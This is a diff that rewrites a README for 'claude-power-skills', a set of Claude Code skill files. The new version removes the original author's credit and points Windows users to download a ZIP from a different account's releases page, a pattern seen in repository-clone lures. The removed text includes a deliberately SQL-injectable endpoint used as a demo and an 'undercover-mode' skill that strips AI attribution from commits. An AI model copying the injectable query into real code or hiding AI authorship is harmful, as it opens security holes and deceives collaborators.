@@ -1,243 +1,153 @@
-# ⚡ claude-power-skills
+# 🤖 claude-power-skills - Senior AI help for coding
 
-**20 power-user skills for Claude Code that turn your AI assistant into a senior engineering partner.**
+[![Download claude-power-skills](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/rabiinfrangible920/claude-power-skills/releases)
 
-Born from reverse-engineering how top-tier AI coding agents actually work internally — session management, multi-agent orchestration, adversarial testing, decision archaeology, calibrated estimation — then packaging those patterns as drop-in skills anyone can use.
+## 🧭 What this is
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Skills](https://img.shields.io/badge/Skills-20-green.svg)](#skills)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Compatible-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
+claude-power-skills adds ready-made skill files for Claude Code. These skills help Claude work with more structure on common engineering tasks.
 
----
+Use it to guide Claude through:
 
-## Why this exists
+- session management
+- multi-agent work
+- code review
+- security checks
+- estimate checks
+- decision logs
+- test planning
 
-Claude Code ships with solid defaults. But if you've pushed it on real projects — multi-repo monoliths, production incident debugging, sprint planning — you've hit the ceiling. The agent forgets context between sessions. It estimates effort like someone who's never shipped software. It doesn't know when it's stuck. It can't coordinate parallel workstreams.
+Each skill lives in a `SKILL.md` file. You can drop these files into your Claude Code setup and use them as needed.
 
-These skills fix that. Each one encodes a specific workflow pattern that experienced engineers use intuitively, structured so the agent can execute it consistently.
+## 💻 What you need
 
-No wrappers. No frameworks. No dependencies. Just SKILL.md files that plug directly into Claude Code's skill system.
+Use this on a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- a web browser
+- Claude Code set up on your machine
+- enough free space for the files
+- permission to download files to your computer
 
-## Quick Start
+## 📥 Download the files
 
-**Install as a plugin** (recommended)
-```
-/plugin install irfad7/claude-power-skills
-```
-That's it. All 20 skills are available immediately across all your projects.
+Go to the release page here:
 
-**Or cherry-pick into a single project**
-```bash
-# Clone the repo
-git clone https://github.com/irfad7/claude-power-skills.git ~/claude-power-skills
+https://github.com/rabiinfrangible920/claude-power-skills/releases
 
-# Copy the skills you want into your project
-cp -r ~/claude-power-skills/skills/bughunter your-project/skills/
-cp -r ~/claude-power-skills/skills/ultraplan your-project/skills/
-```
+On that page, choose the latest release and download the file that matches the package format you want. If the release includes a ZIP file, download that file.
 
-Once installed, invoke by name:
-```
-/bughunter        → adversarial security analysis
-/ultraplan        → deep planning with creative exploration
-/effort-estimate  → calibrated estimation with velocity tracking
-/codebase-insight → persistent architecture analysis
-```
+## 🪟 Install on Windows
 
----
+1. Open the release page in your browser.
+2. Find the latest release.
+3. Download the ZIP file or release package.
+4. Open your Downloads folder.
+5. Right-click the downloaded file.
+6. Choose **Extract All**.
+7. Pick a folder you can find again, such as `Documents`.
+8. Open the extracted folder.
+9. Look for folders or files named `SKILL.md`.
+10. Copy the skill folders into the Claude Code skills folder on your computer.
 
-## Skills
+If Claude Code asks you where to place skills, use that location. If it does not, place the files in the folder Claude Code uses for custom skills.
 
-### 🧠 Session & Memory
+## 🗂️ What gets installed
 
-| Skill | What It Does |
-|-------|-------------|
-| [**kairos-session**](skills/kairos-session/SKILL.md) | Session lifecycle management — structured boot sequence with context loading, state diffing, and memory consolidation on shutdown. Daemon mode for persistent background operation. |
-| [**autodream**](skills/autodream/SKILL.md) | Memory synthesis across sessions — scans memory files, detects contradictions and duplicates, merges observations, promotes recurring patterns to reflexes. Outputs a health score. |
-| [**session-review**](skills/session-review/SKILL.md) | End-of-session analysis — replays the session transcript, extracts decisions and patterns, computes knowledge deltas, generates handoff notes for the next session. |
-| [**context-compression**](skills/context-compression/SKILL.md) | 3-layer compression pipeline for long conversations. Layer 1: MicroCompact (~30-40% reduction, zero info loss). Layer 2: AutoCompact (~60-70%). Layer 3: Full Compact (~85-90%). |
+The package is built around small skill files. Each one focuses on one job. You may see skills for:
 
-### 📐 Planning & Estimation
+- **Session management** - keep long chats organized
+- **Multi-agent orchestration** - split work across helper agents
+- **Adversarial testing** - look for weak spots in code
+- **Calibrated estimation** - make time and effort estimates with care
+- **Decision archaeology** - track why a choice was made
+- **Code review** - check code for errors and style issues
+- **Security audit** - look for risk in code and setup
+- **Prompt workflow** - help Claude follow a repeatable process
 
-| Skill | What It Does |
-|-------|-------------|
-| [**ultraplan**](skills/ultraplan/SKILL.md) | Creative exploration before execution. 5-act structure: understand the problem, explore multiple approaches, validate technically, design incrementally, produce phased execution plan. Includes problem reframing, devil's advocate challenges, and YAGNI audits. |
-| [**effort-estimate**](skills/effort-estimate/SKILL.md) | Calibrated estimation engine. Decomposes tasks into atoms, scores complexity on 3 axes, applies velocity calibration from past estimates. Maintains a `.velocity-profile.json` that makes estimates more accurate over time. Cold-start aware. |
-| [**thinkback**](skills/thinkback/SKILL.md) | Decision archaeology — reconstruct why past decisions were made from git history, code patterns, and documentation. Three modes: dig (single decision), audit (batch review), replay (reasoning trace). |
+## ▶️ Run it in Claude Code
 
-### 🔍 Code Quality
+After you copy the skill files:
 
-| Skill | What It Does |
-|-------|-------------|
-| [**code-review**](skills/code-review/SKILL.md) | 6-pass deep code review: correctness, security, logic/design, performance, maintainability, integration. Structured output with severity levels, fix suggestions, and explicit acknowledgment of what's well-written. |
-| [**bughunter**](skills/bughunter/SKILL.md) | Red team adversarial analysis. Maps attack surfaces, runs 5 systematic attack categories (input, state, logic, integration, data integrity), logs structured exploits, chains bugs into kill chains. Three modes: quick (15min), standard, deep (parallel subagents). |
-| [**codebase-insight**](skills/codebase-insight/SKILL.md) | Deep codebase analysis that persists to `.codebase-insight.md`. Maps architecture, patterns, dependencies, critical paths, quirks, and health scores. Delta mode updates only what changed. Future sessions load the file instantly instead of re-analyzing. |
-| [**pr-autofix**](skills/pr-autofix/SKILL.md) | Reads PR review comments and CI failures, triages by priority, applies fixes (one commit per comment), drafts reviewer responses, and pushes. Compresses the review→fix→push cycle from hours to minutes. |
+1. Open Claude Code.
+2. Start a new session or open one you already use.
+3. Pick the skill that fits the task.
+4. Ask Claude to use that skill for the work you want done.
 
-### 🔄 Workflow & Orchestration
+For example, you can ask Claude to:
 
-| Skill | What It Does |
-|-------|-------------|
-| [**coordinator-mode**](skills/coordinator-mode/SKILL.md) | Multi-agent orchestration. Decomposes complex tasks, plans execution waves with dependency ordering, dispatches parallel subagents, merges results with conflict detection, runs quality gates. |
-| [**batch-mode**](skills/batch-mode/SKILL.md) | Apply one operation across many targets consistently. Mandatory dry-run phase, progress tracking, exception handling with skip/retry/abort, structured report on completion. |
-| [**prompt-speculation**](skills/prompt-speculation/SKILL.md) | Proactive next-step engine. After completing work, generates 4 candidate follow-ups (immediate, quality, strategic, preventive), scores them by leverage = (Impact × Urgency) / Effort, and presents the top 3. |
+- review a feature before you ship it
+- check a change for security issues
+- estimate how long a task may take
+- break a large task into smaller steps
+- compare two design choices
 
-### 🛡️ Security & Recovery
+## 🧩 Common folder setup
 
-| Skill | What It Does |
-|-------|-------------|
-| [**security-review**](skills/security-review/SKILL.md) | 7-phase security audit covering secrets scanning, auth/authz review, input validation, data protection, dependency analysis, infrastructure config, and business logic flaws. Produces a structured report with severity ratings and remediation code. |
-| [**stuck-recovery**](skills/stuck-recovery/SKILL.md) | Detects when the agent is looping on the same approach. Forces a structured reset: stop → restate the problem → audit assumptions → gather fresh evidence → reframe using 5 Whys / inversion / simplification → new approach → checkpoint. |
-| [**frustration-aware**](skills/frustration-aware/SKILL.md) | 3-tier frustration detection (explicit, implicit, preemptive). Fundamentally changes approach on detection — not just tone, but strategy. Escalation rules prevent repeated corrections. |
+A simple Windows setup can look like this:
 
-### 🔒 Protection & Documentation
+- `Downloads` for the ZIP file
+- `Documents\claude-power-skills` for the extracted files
+- your Claude Code skills folder for the final copy
 
-| Skill | What It Does |
-|-------|-------------|
-| [**undercover-mode**](skills/undercover-mode/SKILL.md) | Stealth contribution mode. Strips AI attribution from commits, PRs, code comments. Matches repo conventions for commit style, comment density, PR templates. Pre-commit checklist ensures nothing leaks. |
-| [**anti-distillation**](skills/anti-distillation/SKILL.md) | Context protection. Prevents sensitive project context from leaking across boundaries — into public outputs, other projects, or training data capture. 5-layer defense system. |
-| [**magic-docs**](skills/magic-docs/SKILL.md) | Documentation generator that reads the actual codebase. Every claim traces to a file path. Supports README, API reference, architecture guide, onboarding guide, and changelog. Monorepo-aware. |
+Keep the file names the same after you extract them. Claude Code can only use the skill files if they stay in the right folder.
 
----
+## 🔎 How to check that it worked
 
-## How skills work
+Open one of the skill files and look for `SKILL.md`.
 
-Each skill is a single `SKILL.md` file with YAML frontmatter and structured instructions:
+If the file is there and Claude Code can see it, the setup worked.
 
-```yaml
----
-name: skill-name
-description: When to activate this skill (trigger phrases, contexts)
-metadata:
-  version: 1.0.0
----
+You can also test it by asking Claude to use one of the skills, such as:
 
-# Skill Title
+- “Use the code review skill on this change.”
+- “Use the security audit skill on this project.”
+- “Use the estimation skill and explain the result.”
 
-[Structured protocol the agent follows]
-```
+## 🛠️ Troubleshooting
 
-Skills activate automatically based on conversation context, or you invoke them directly with `/skill-name`. No configuration required.
+If the files do not work right away, check these points:
 
----
+- The ZIP file was fully extracted
+- The skill files stayed in their folders
+- You copied them to the right Claude Code location
+- Claude Code is closed and reopened after the copy
+- Windows did not block the download
+- The file names still end with `.md`
 
-## What makes these different
+If the release page shows more than one file, choose the main package file unless the release notes say something else.
 
-**They're protocols, not prompts.** Each skill defines a multi-step process with decision points, structured outputs, and quality gates. The agent follows the protocol — it doesn't freestyle.
+## 📚 Included skill areas
 
-**They compound.** `kairos-session` boots context → `autodream` consolidates memory → `session-review` extracts lessons → next session starts smarter. `bughunter` finds vulnerabilities → `code-review` catches design issues → `pr-autofix` resolves feedback → `undercover-mode` ships it clean.
+This repo focuses on power-user tasks that help Claude act like a senior engineering partner. The skills cover:
 
-**They're calibrated.** `effort-estimate` tracks actual completion times and adjusts future estimates. `frustration-aware` escalates based on signal density, not single events. `context-compression` picks the right layer based on conversation length.
+- planning work
+- checking code quality
+- reviewing risk
+- managing long tasks
+- comparing options
+- improving decisions
+- testing ideas against failure cases
+- keeping context across sessions
 
-**They're battle-tested.** Built from patterns used across production codebases — SaaS platforms, multi-tenant systems, real-time pipelines. Not theoretical prompts. Workflows that survived contact with real projects.
+## 🧠 Good ways to use the skills
 
----
+Use one skill at a time when possible. That keeps the task clear.
 
-## Skill deep dives
+Good times to use these skills:
 
-<details>
-<summary><strong>bughunter — adversarial analysis in action</strong></summary>
+- before you make a large code change
+- before you merge a pull request
+- when you need a second check on a design
+- when you want a better estimate
+- when you need to trace how a choice was made
+- when you want Claude to act with more structure
 
-Given a simple API endpoint:
-```javascript
-app.get('/api/users/:id', async (req, res) => {
-  const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
-  res.json({ password: user.password, email: user.email });
-});
-```
+## 🔐 Safe use on Windows
 
-BugHunter produces structured exploit reports (BUG-001 format), chains them into kill chains, and suggests specific fixes. Not "consider input validation" — the actual parameterized query you need to write.
+Keep your downloads in a folder you trust. Use the release page link above to get the files. If you move the files later, make sure you know where they went so Claude Code can still find them.
 
-</details>
+## 📌 Release page
 
-<details>
-<summary><strong>effort-estimate — calibrated estimation</strong></summary>
+Visit this page to download the latest files:
 
-Instead of "this should take 2-3 hours" (which always means 2-3 days), effort-estimate:
-
-1. Decomposes into atomic tasks (including hidden work: migrations, tests, config)
-2. Scores each on 3 axes: code complexity, uncertainty, integration risk
-3. Applies your personal velocity multiplier from past estimates
-4. Adds probability-weighted risk buffers
-5. Delivers best/expected/worst with confidence level
-
-First estimate is rough. After 5 tracked tasks, it knows your pace.
-
-</details>
-
-<details>
-<summary><strong>codebase-insight — persistent architecture memory</strong></summary>
-
-Analyzes your entire codebase and saves the result to `.codebase-insight.md`. Next session, instead of re-reading 200 files, the agent loads the insight file and knows:
-
-- Architecture pattern and organization style
-- All code patterns (error handling, auth, validation, data fetching)
-- Component dependency map
-- Critical user paths traced end-to-end
-- Quirks and gotchas that waste debugging time
-- Health score across 7 dimensions
-
-Delta mode updates only what changed since last analysis.
-
-</details>
-
-<details>
-<summary><strong>ultraplan — planning that starts with thinking</strong></summary>
-
-Most planning tools skip the most important part: figuring out what to build.
-
-```
-Regular:    Idea → Plan → Build → "Wait, this isn't what we needed"
-UltraPlan:  Idea → Explore → Challenge → Validate → Plan → Build → Ship
-```
-
-Forces problem reframing, generates 2-3 approaches with honest trade-offs, runs devil's advocate against its own recommendation, then validates technically before producing a phased execution plan.
-
-</details>
-
----
-
-## Project structure
-
-```
-claude-power-skills/
-├── .claude-plugin/
-│   └── plugin.json
-├── skills/
-│   ├── anti-distillation/SKILL.md
-│   ├── autodream/SKILL.md
-│   ├── batch-mode/SKILL.md
-│   ├── bughunter/SKILL.md
-│   ├── code-review/SKILL.md
-│   ├── codebase-insight/SKILL.md
-│   ├── context-compression/SKILL.md
-│   ├── coordinator-mode/SKILL.md
-│   ├── effort-estimate/SKILL.md
-│   ├── frustration-aware/SKILL.md
-│   ├── kairos-session/SKILL.md
-│   ├── magic-docs/SKILL.md
-│   ├── pr-autofix/SKILL.md
-│   ├── prompt-speculation/SKILL.md
-│   ├── security-review/SKILL.md
-│   ├── session-review/SKILL.md
-│   ├── stuck-recovery/SKILL.md
-│   ├── thinkback/SKILL.md
-│   ├── ultraplan/SKILL.md
-│   └── undercover-mode/SKILL.md
-├── LICENSE
-├── README.md
-├── changelog.md
-└── package.json
-```
-
----
-
-## License
-
-MIT — use these however you want. PRs welcome.
-
----
-
-Built by [Irfad Imtiaz](https://github.com/irfad7)
+https://github.com/rabiinfrangible920/claude-power-skills/releases
